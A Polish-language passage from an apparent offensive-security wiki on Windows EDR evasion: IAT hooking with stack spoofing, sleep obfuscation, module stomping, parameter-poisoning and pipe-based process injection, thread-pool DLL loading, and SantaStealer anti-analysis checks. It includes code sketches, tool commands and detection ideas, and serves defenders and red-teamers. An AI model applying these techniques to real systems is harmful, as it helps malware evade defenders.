- Każdy wrapper PIC wykonuje evasion przed przekazaniem wywołania do właściwego adresu API. Typowe techniki evasion obejmują:
  - Maskowanie/odmaskowanie pamięci wokół wywołania (np. szyfrowanie obszarów beaconu, RWX→RX, zmiana nazw/pozwoleń stron), a następnie przywrócenie stanu po wywołaniu.
  - Call-stack spoofing: utworzenie pozornie nieszkodliwego stosu i przejście do docelowego API, tak aby analiza call stacka rozpoznała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Dla zachowania kompatybilności udostępnij interfejs, który pozwoli skryptowi Aggressor (lub jego odpowiednikowi) określić, które API hookować dla Beacon, BOF-ów i bibliotek DLL używanych w post-exploitation.

Dlaczego w tym przypadku warto hookować IAT
- Działa dla każdego kodu korzystającego z hookowanego importu, bez modyfikowania kodu narzędzia ani polegania na Beaconie, który miałby pośredniczyć w wybranych API.
- Obejmuje biblioteki DLL używane w post-exploitation: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować te same techniki maskowania/omijania analizy stosu do wywołań ich API.
- Przywraca niezawodne użycie poleceń post-exploitation tworzących procesy w środowiskach z detekcją opartą na call stacku, dzięki wrapperom CreateProcessA/W.

Minimalny szkic hooka IAT (pseudokod x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj patch po relokacjach/ASLR, a przed pierwszym użyciem importu. Reflective loadery, takie jak TitanLdr/AceLdr, pokazują hooking podczas DllMain załadowanego modułu.
- Wrappery powinny być niewielkie i bezpieczne dla PIC; prawdziwe API rozwiązuj za pomocą oryginalnej wartości IAT przechwyconej przed patchem albo przez LdrGetProcedureAddress.
- W przypadku PIC stosuj przejścia RW → RX i unikaj pozostawiania stron z uprawnieniami do zapisu i wykonywania.

Stub do spoofingu call stacka
- Stub-y PIC w stylu Draugr budują fałszywy łańcuch wywołań (adresy powrotu do benign modules), a następnie wykonują skok do prawdziwego API.
- Pozwala to ominąć detekcje oczekujące kanonicznych stacków z Beacon/BOFs przy wywołaniach wrażliwych API.
- Połącz to z technikami stack cutting/stack stitching, aby przed prologiem API znaleźć się wewnątrz oczekiwanych ramek.

Integracja operacyjna
- Dodaj reflective loader przed post-ex DLL, aby PIC i hooki inicjalizowały się automatycznie podczas ładowania DLL.
- Użyj skryptu Aggressor do rejestrowania docelowych API, aby Beacon i BOFs korzystały transparentnie z tej samej ścieżki evasion bez zmian w kodzie.

Kwestie detekcji/DFIR
- Integralność IAT: wpisy wskazujące na adresy spoza obrazu (heap/anon); okresowa weryfikacja wskaźników importu.
- Anomalie stacka: adresy powrotu nienależące do załadowanych obrazów; nagłe przejścia do PIC spoza obrazu; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy do IAT wewnątrz procesu, wczesna aktywność DllMain modyfikująca import thunks, nieoczekiwane regiony RX tworzone podczas ładowania.
- Unikanie image-load: jeśli hookujesz LoadLibrary*, monitoruj podejrzane załadowania automation/clr assemblies skorelowane ze zdarzeniami maskowania pamięci.

Powiązane elementy i przykłady
- Reflective loadery wykonujące patching IAT podczas ładowania (np. TitanLdr, AceLdr)
- Hooki maskujące pamięć (np. simplehook) i PIC do stack cutting (stackcutting)
- Stub-y PIC do spoofingu call stacka (np. Draugr)


## Hooking IAT podczas importu + sleep obfuscation (Crystal Palace/PICO)

### Hooki IAT podczas importu za pośrednictwem rezydentnego PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik `GetProcAddress` loadera własnym resolverem, który najpierw sprawdza hooki:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Zbuduj **rezydentny PICO** (trwały obiekt PIC), który przetrwa zwolnienie tymczasowego PIC loadera.
- Udostępnij funkcję `setup_hooks()`, która nadpisuje resolver importów loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy ordinal i stosuj wyszukiwanie hooków oparte na hashach, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie wywołaj prawdziwe `GetProcAddress`.
- Rejestruj docelowe hooki w czasie linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje prawidłowy, ponieważ znajduje się wewnątrz rezydentnego PICO.

Dzięki temu uzyskasz **przekierowanie IAT podczas importu** bez patchowania sekcji kodu załadowanej DLL po jej załadowaniu.

### Wymuszanie importów, które można hookować, gdy cel używa PEB-walking

Hooki podczas importu uruchamiają się tylko wtedy, gdy funkcja faktycznie znajduje się w IAT celu. Jeśli moduł rozwiązuje API za pomocą PEB-walk + hash (bez wpisu importu), wymuś rzeczywisty import, aby ścieżka `ProcessImports()` loadera go obsłużyła:

- Zastąp rozwiązywanie eksportów po hashu (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając przechwycenie podczas rozwiązywania importów przez reflective loader.

### Sleep/idle obfuscation w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste prymitywy oczekiwania/IPC** używane przez implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Przy długim oczekiwaniu opakuj wywołanie w łańcuch obfuscation w stylu Ekko, który szyfruje obraz w pamięci podczas bezczynności:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z przygotowanymi ramkami `CONTEXT`.
- Typowy łańcuch (x64): ustaw obraz na `PAGE_READWRITE` → zaszyfruj RC4 przez `advapi32!SystemFunction032` cały zamapowany obraz → wykonaj blokujące oczekiwanie → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, iterując po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać poszczególne kroki.

Szczegół operacyjny: zwracaj „success” dla długiego oczekiwania (np. `WAIT_OBJECT_0`), aby wywołujący kontynuował działanie, gdy obraz pozostaje zamaskowany. Ten wzorzec ukrywa moduł przed skanerami w okresach bezczynności i pozwala uniknąć charakterystycznego wzorca „patched `Sleep()`”.

Pomysły na detekcję (na podstawie telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buforach o rozmiarze obrazu.
- `VirtualProtect` obejmujące duży zakres, po którym następuje przywracanie niestandardowych uprawnień poszczególnych sekcji.

### Rejestracja CFG w runtime dla gadżetów sleep obfuscation

W celach z włączonym CFG pierwszy pośredni skok do gadżetu ze środka funkcji, takiego jak `jmp [rbx]` lub `jmp rdi`, zazwyczaj zakończy się awarią procesu z `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadżetu nie ma w metadanych CFG modułu. Aby łańcuchy w stylu Ekko/Kraken działały w zabezpieczonych procesach:<sup>[[30]](#references)</sup>

- Zarejestruj każdy pośredni cel wykorzystywany przez łańcuch za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- W przypadku adresów wewnątrz załadowanych obrazów (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **bazy obrazu** i obejmować **pełny rozmiar obrazu**.
- W przypadku regionów mapowanych ręcznie/PIC/stomped użyj **bazy alokacji** i rozmiaru alokacji.
- Oznacz nie tylko gadżet dispatch, ale także eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wywołania wait/event) oraz wszelkie kontrolowane przez atakującego sekcje wykonywalne, które staną się pośrednimi celami.

Zmienia to łańcuchy sleep w stylu ROP/JOP z „działają tylko w procesach bez CFG” w wielokrotnego użytku prymityw dla `explorer.exe`, przeglądarek, `svchost.exe` i innych endpointów skompilowanych z `/guard:cf`.

### Spoofing stacka bezpieczny dla CET w uśpionych wątkach

Pełna podmiana `CONTEXT` jest łatwa do wykrycia i może nie działać w systemach z CET Shadow Stack, ponieważ spoofowany `Rip` musi nadal zgadzać się ze sprzętowym shadow stackiem. Bezpieczniejszy wzorzec sleep masking:<sup>[[30]](#references)</sup>

- Wybierz inny wątek w tym samym procesie i odczytaj granice jego stacka `NT_TIB` / TEB (`StackBase`, `StackLimit`) przez `NtQueryInformationThread`.
- Zapisz bieżący TEB/TIB wątku.
- Przechwyć rzeczywisty kontekst uśpionego wątku za pomocą `GetThreadContext`.
- Skopiuj **wyłącznie** rzeczywisty `Rip` do spoofowanego kontekstu, pozostawiając spoofowane `Rsp`/stan stacka bez zmian.
- Podczas uśpienia skopiuj `NT_TIB` spoofowanego wątku do bieżącego TEB, aby stack walker przechodził przez prawidłowy zakres stacka.
- Po zakończeniu oczekiwania przywróć pierwotny TIB i kontekst wątku.

Pozwala to zachować wskaźnik instrukcji zgodny z CET, a jednocześnie wprowadza w błąd stack walkery EDR, które polegają na metadanych stacka TEB przy walidacji unwindów.

### Alternatywa oparta na APC: Kraken Mask

Jeśli dispatch przez timer-queue jest zbyt charakterystyczny, tę samą sekwencję sleep-encrypt-spoof-restore można wykonać z użyciem zawieszonego wątku pomocniczego i kolejkowanych APC:<sup>[[27]](#references)</sup>

- Utwórz wątek pomocniczy z `NtTestAlert` jako entrypoint.
- Kolejkuj przygotowane ramki `CONTEXT`/APC za pomocą `NtQueueApcThread` i opróżniaj kolejkę przez `NtAlertResumeThread`.
- Przechowuj stan łańcucha na heapie, a nie na stacku wątku pomocniczego, aby uniknąć wyczerpania domyślnego stacka wątku o rozmiarze 64 KB.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować zdarzenie startowe i zablokować działanie.
- Zawieś główny wątek przed przywróceniem TIB/kontekstu (`NtSuspendThread` → restore → `NtResumeThread`), aby skrócić okno wyścigu, w którym skaner mógłby wykryć częściowo przywrócony stack.

Zastępuje to charakterystyczny wzorzec `CreateTimerQueueTimer` + `NtContinue` wzorcem wątku pomocniczego/APC, zachowując te same cele RC4 masking i spoofingu stacka.

Dodatkowe pomysły na detekcję
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` tuż przed uśpieniem, oczekiwaniem lub dispatch APC.
- `GetThreadContext`/`SetThreadContext` używane wokół `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do granic stacka TEB/TIB bieżącego wątku.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread`, które pośrednio docierają do `SystemFunction032`, `VirtualProtect` lub helperów przywracających uprawnienia sekcji.
- Powtarzające się użycie krótkich sygnatur gadżetów, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako pivotów dispatch wewnątrz podpisanych modułów.


## Precyzyjny module stomping

Module stomping wykonuje payloady z **sekcji `.text` DLL już zamapowanej w procesie docelowym**, zamiast alokować oczywistą prywatną pamięć wykonywalną lub ładować nową, ofiarną DLL. Celem nadpisania powinien być **załadowany obraz oparty na pliku na dysku**, którego obszar kodu może pomieścić payload bez uszkadzania ścieżek kodu nadal potrzebnych procesowi.<sup>[[1]](#references)[[2]](#references)</sup>

### Niezawodny wybór celu

Naiwny stomping popularnych modułów, takich jak `uxtheme.dll` lub `comctl32.dll`, jest zawodny: DLL może nie być załadowana w zdalnym procesie, a zbyt mały obszar kodu spowoduje awarię procesu. Bardziej niezawodny proces:

1. Wylicz moduły procesu docelowego i zachowaj **listę dozwolonych nazw** już załadowanych DLL.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj pliki DLL-kandydatów na dysku i porównaj **`.text` `Misc_VirtualSize`** sekcji PE z rozmiarem payloadu. Ma to większe znaczenie niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji wykonywalnej **po zamapowaniu w pamięci**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako początkowy offset stomping.
5. Oblicz **blast radius**: jeśli payload przekracza granicę wybranej funkcji, nadpisze sąsiednie eksporty ułożone za nią w pamięci.

Typowe helpery recon/walidacji wyboru spotykane w praktyce:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Uwagi operacyjne
- Preferuj biblioteki DLL **już załadowane** w procesie zdalnym, aby uniknąć telemetrii związanej z `LoadLibrary` i nieoczekiwanym ładowaniem obrazów.
- Preferuj eksporty, które aplikacja docelowa rzadko wywołuje. W przeciwnym razie zwykłe ścieżki kodu mogą trafić na nadpisane bajty przed utworzeniem wątku lub po nim.
- W przypadku dużych implantów często trzeba zmienić sposób osadzania shellcode z literału tekstowego na **tablicę bajtów/inicjalizator w nawiasach klamrowych**, aby cały bufor został poprawnie uwzględniony w kodzie injectora.

Pomysły na wykrywanie
- Zdalne zapisy do stron wykonywalnych mapowanych z obrazu (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast do częstszych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie są już zgodne z odpowiadającymi im danymi w pliku na dysku.
- Zdalne wątki lub zmiany kontekstu wykonania, które rozpoczynają działanie wewnątrz eksportu legalnej biblioteki DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` dotyczące stron `.text` biblioteki DLL, po których następuje tworzenie wątku.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) to technika **wstrzykiwania do procesu / omijania EDR**, która pozwala uniknąć klasycznej ścieżki zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już działającego procesu docelowego, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki podatne na zatruwanie, kopiowane przez `CreateProcessW`

Przydatne nośniki:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograniczenia praktyczne dotyczące nośników:

- `lpCommandLine` musi wskazywać na **pamięć zapisywalną** dla `CreateProcessW`, a jego długość jest ograniczona do **32 767 znaków Unicode**, łącznie z terminatorem null.
- `lpEnvironment` musi być blokiem środowiska Unicode zawierającym kolejne ciągi `NAME=VALUE\0`, zakończone dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie na `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilny, udokumentowany kontrakt.

Dzięki temu zwykłe tworzenie procesu staje się **mechanizmem transferu payloadu**. Operator tworzy proces potomny z kontrolowanymi przez atakującego danymi startowymi, a Windows wykonuje kopiowanie między procesami.

### Zdalne wyszukiwanie bez zdalnych API zapisu

Po utworzeniu procesu potomnego można odszukać skopiowany bufor za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Podążaj za `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalny przebieg:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Wykonywanie skopiowanego bufora parametrów

Skopiowany region parametrów ma zwykle uprawnienia `RW`, a nie jest wykonywalny. Typowy łańcuch P3 wygląda tak:

1. Utwórz proces normalnie (nie w stanie wstrzymania)
2. Nadaj wybranej stronie parametrów uprawnienia do wykonywania za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Użyj ponownie uchwytu głównego wątku zwróconego już w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisz `RIP`)

W przeciwieństwie do klasycznych schematów thread hijacking nie wymaga to użycia `SuspendThread` / `ResumeThread`; kontekst można zmienić bezpośrednio za pomocą zwróconego uchwytu głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często także `SuspendThread` / `ResumeThread`

### Ograniczenie związane z bajtem null i staged shellcode

Wszystkie trzy nośniki to **dane tekstowe lub podobne do tekstu**, więc surowy payload zawierający `0x00` zostaje obcięty podczas transferu. Praktycznym rozwiązaniem jest **pierwszy etap bez bajtów null**, który odtwarza stałe w czasie działania, a następnie ładuje dowolny drugi etap.

Prosty schemat polega na syntezie stałych za pomocą XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dzięki temu pierwszy etap może tworzyć na stosie ciągi znaków, argumenty API, ścieżki DLL lub loader shellcode’u drugiego etapu bez umieszczania bajtów null w przesyłanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywoływać API, takie jak `LoadLibraryA`, może:

- umieścić ciąg znaków/bufor na stosie procesu docelowego
- zarezerwować **32-bajtowy shadow space x64**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Drugi etap można następnie skopiować ze stosu do alokacji `PAGE_READWRITE`, zmienić jej ochronę na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect` i wykonać skok do niej, unikając bezpośredniej alokacji RWX.

### Pomysły na wykrywanie

Dobre możliwości wykrywania wymienione przez autorów:

- `VirtualProtectEx` / `NtProtectVirtualMemory` zmieniające ochronę **stron parametrów procesu** na wykonywalną
- następująca po tej zmianie ochrony operacja `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie lub o wysokiej entropii wartości `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **sztuczka transferu między procesami**, a nie samodzielny, kompletny mechanizm wykonania: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- Autorzy rozważali `RtlCreateProcessReflection` / Dirty Vanity, ale odrzucili tę metodę, ponieważ wewnętrznie korzysta z podejrzanych prymitywów, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

Aby dostarczyć payload do **istniejącego** procesu Windows za pośrednictwem opisów wątków, a następnie przejąć adres powrotu uśpionego wątku, zobacz [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Iniekcja przez potok STDIN konsoli

Interaktywny proces potomny konsoli może również posłużyć jako **prymityw transferu payloadu**. Injector przekierowuje standardowe wejście procesu potomnego do potoku i wysyła znacznik, a następnie shellcode. Gdy program konsoli odczyta dane do własnej prywatnej pamięci, injector znajduje ten bufor, nadaje mu uprawnienia do wykonywania i przekierowuje do niego wątek procesu potomnego. Pozwala to uniknąć `VirtualAllocEx` i `WriteProcessMemory`, ale nadal jest to iniekcja procesu, a nie ogólna metoda obejścia EDR.<sup>[[41]](#references)</sup>

Mimo określenia „named-pipe” implementacja referencyjna wywołuje `CreatePipe`, która tworzy **potok anonimowy**. Windows implementuje potoki anonimowe wewnętrznie przy użyciu obiektów potoków o unikatowych nazwach, ale PoC ani nie wybiera ścieżki `\\.\pipe\<name>`, ani nie wywołuje `CreateNamedPipe`. Tworzy dziedziczone uchwyty z domyślnym deskryptorem zabezpieczeń, umieszcza uchwyt odczytu w `STARTUPINFO.hStdInput`, ustawia `STARTF_USESTDHANDLES` i uruchamia nowy proces potomny z włączonym dziedziczeniem uchwytów. Dlatego ten PoC uruchamia podany plik wykonywalny konsoli; nie dołącza potoku do istniejącego procesu.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Przebieg referencyjny

Implementacja korzysta z następującego łańcucha:<sup>[[41]](#references)</sup>

1. Utwórz pary potoków anonimowych dla `STDIN` i `STDOUT` procesu potomnego. Wyłącz dziedziczenie dla dwóch uchwytów po stronie procesu nadrzędnego i zamknij duplikaty uchwytów po stronie procesu potomnego w procesie nadrzędnym po utworzeniu procesu.
2. Uruchom interaktywny plik wykonywalny, taki jak `netsh.exe` lub `nslookup.exe`, z flagą `CREATE_NEW_CONSOLE`. Proces potomny dziedziczy przekierowane standardowe uchwyty.
3. Wyślij całą tablicę binarną `rawData` za pomocą `WriteFile` przez uchwyt `STDIN` po stronie procesu nadrzędnego. Program konsoli odczytuje bajty i pozostawia kopię w jednym ze swoich prywatnych zaalokowanych obszarów pamięci.
4. Przejdź przestrzeń adresową procesu potomnego za pomocą `VirtualQueryEx`, odczytaj kandydackie regiony `MEM_PRIVATE` przez `ReadProcessMemory` i wyszukaj znacznik na początku `rawData`.
5. Zmień ochronę wykrytego bufora na `PAGE_EXECUTE_READWRITE` za pomocą `VirtualProtectEx`.
6. Zidentyfikuj główny wątek, wstrzymaj go, ustaw `RIP` na `found_address + 0x19` za pomocą `NtSetContextThread` i wznów jego działanie.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostarczona implementacja jest specyficzna dla x64: modyfikuje `CONTEXT.Rip`, a osadzony payload to shellcode x64. `rawData` zaczyna się 25-bajtowym znacznikiem, więc wykonywalne bajty zaczynają się pod offsetem szesnastkowym `0x19`. Przy zastępowaniu payloadu zachowaj ten układ albo zaktualizuj jednocześnie znacznik, wektor wyszukiwania, rozmiar tablicy i offset wykonania. Komentarze w kodzie źródłowym wymieniają też `0x0A`, `0x0D` i `0x1A` jako bad characters. Ten workflow nie zmienia tokenu ani uprawnień procesu potomnego.<sup>[[41]](#references)</sup>

Informacje o małych natywnych helperach i wzorcach kompilacji payloadów znajdziesz w [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Wstrzykiwanie DLL przez callback puli wątków bez shellcode (DLLParty)

DLLParty adaptuje wstrzykiwanie do puli wątków w stylu PoolParty, aby istniejący worker procesu docelowego wywołał `LoadLibraryA`, zamiast wykonywać wstrzyknięty stub callbacku. Jego prymitywem dyspozycji jest `TP_DIRECT` przekazany do portu ukończenia we/wy puli procesu docelowego. Nie omija to uprawnień procesu: PoC wywołuje `OpenProcess(PROCESS_ALL_ACCESS)` i wymaga pamięci procesu docelowego z prawem odczytu i zapisu oraz uchwytów do worker factory i portu ukończenia, które można duplikować.<sup>[[46]](#references)[[47]](#references)</sup>

W systemie Windows x64 worker przekazuje wskaźnik do instancji `TP_CALLBACK_INSTANCE` znajdującej się na jego stosie w `RCX`, czyli w pierwszym argumencie callbacku. `LoadLibraryA` interpretuje ten sam wskaźnik jako `LPCSTR`. W testowanej ścieżce `TppWorkerThread` tworzy wskaźnik pod `RSP+0x178`, a pierwszy zwykły zapis do tego obiektu wykonuje pod `RSP+0x1d0`. Zakończona znakiem null ścieżka do DLL, która mieści się w tym prefiksie o rozmiarze 0x58 bajtów, może więc znaleźć się na początku instancji i nie zostanie nadpisana przed dyspozycją. To obserwacja dotycząca konkretnej kompilacji, a nie udokumentowana gwarancja ABI systemu Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Referencyjny workflow:<sup>[[46]](#references)[[47]](#references)</sup>

1. Wylicz uchwyty procesu docelowego za pomocą `NtQuerySystemInformation(SystemHandleInformation)` i zidentyfikuj `TpWorkerFactory`, odpytując typy obiektów. Zduplikuj uchwyt worker factory i odpytaj `WorkerFactoryBasicInformation`; `StartParameter` wskazuje zdalny `TP_POOL`. Pomiń fabryki, dla których `TotalWorkerCount == 0`.
2. Odczytaj `TP_POOL.CompletionPort` i przejdź przez prywatną listę workerów puli. W testowanej kompilacji Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) jej głowa znajduje się pod adresem `pool+0x60`; każde łącze znajduje się pod adresem `worker+0x10`, więc slot instancji callbacku pod `worker+0x38` odpowiada `link+0x28`. PoC sprawdza wyrównanie wskaźników, wzajemność łączy, przynależność do puli, niezerowe identyfikatory wątków, powtarzające się węzły i stabilność głowy listy.
3. Zapisz ścieżkę DLL we **wszystkich** odzyskanych slotach workerów, ponieważ przekazane ukończenie może zostać obsłużone przez dowolnego workera. Umieść `TP_DIRECT` z `Callback = LoadLibraryA` w zapisywalnej pamięci procesu docelowego. PoC używa `last_slot-0x500` na stosie workera zamiast `VirtualAllocEx`; ten offset jest eksperymentalny i nie może kolidować z aktywnymi danymi stosu.
4. Zduplikuj uchwyt portu ukończenia procesu docelowego i wywołaj `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Zdalny adres `TP_DIRECT` jest kluczem ukończenia. Istniejący worker wywołuje następnie `LoadLibraryA` z nadpisanym wskaźnikiem instancji callbacku, ładując DLL dostępną już dla procesu docelowego.

PoC przyjmuje PID procesu docelowego (`DLLParty.exe <target_pid>`) i używa ścieżki do DLL wpisanej na stałe w `DLLParty.cpp`; przed kompilacją pliku wykonywalnego x64 ustaw ścieżkę dostępną dla procesu docelowego. Używa również adresu `LoadLibraryA` z własnego procesu jako zdalnego callbacku, zakładając więc, że ten adres jest prawidłowy w procesie docelowym. Kod nie sprawdza długości ścieżki względem prefiksu o rozmiarze 0x58 bajtów ani tego, czy podczas przechodzenia listy workerów znaleziono slot, zanim odwoła się do ostatniego elementu. Ponownie zweryfikuj prywatne offsety, układ stosu i dostępną przestrzeń do zapisu dla docelowej kompilacji. Pominięcie `CreateRemoteThreadEx`, shellcode i `VirtualAllocEx` nie eliminuje zapisów między procesami ani telemetrii ładowania DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Taktyki SantaStealer służące do fileless evasion i kradzieży poświadczeń

SantaStealer (znany też jako BluelineStealer) pokazuje, jak współczesne info-stealery łączą AV bypass, anti-analysis i dostęp do poświadczeń w jednym workflow.<sup>[[24]](#references)</sup>

### Wybór na podstawie układu klawiatury i opóźnienie w sandboxie

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli wykryje układ cyryliczny, próbka tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nie uruchamia się w wykluczonych lokalizacjach, pozostawiając jednocześnie artefakt przydatny do polowania na zagrożenia.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, hashuje każdą nazwę przy użyciu niestandardowej sumy kontrolnej z funkcją mieszającą i porównuje wynik z osadzonymi listami blokowanych nazw debuggerów/sandboxów; powtarza obliczanie sumy kontrolnej dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, niedawny czas od uruchomienia), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, i przeprowadza pomiary czasu przed uśpieniami i po nich, aby wykryć single-stepping. Każde wykrycie powoduje przerwanie działania przed uruchomieniem modułów.

### Pomocnik bez plików + podwójne ładowanie refleksyjne ChaCha20

- Główna DLL/EXE osadza pomocnika Chromium do obsługi poświadczeń, który jest zapisywany na dysku albo ręcznie mapowany w pamięci; w trybie fileless samodzielnie rozwiązuje importy/relokacje, dzięki czemu nie są zapisywane żadne artefakty pomocnika.
- Ten pomocnik przechowuje DLL drugiego etapu zaszyfrowaną dwukrotnie algorytmem ChaCha20 (dwa klucze 32-bajtowe + 12-bajtowe nonce). Po obu przebiegach refleksyjnie ładuje blob (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
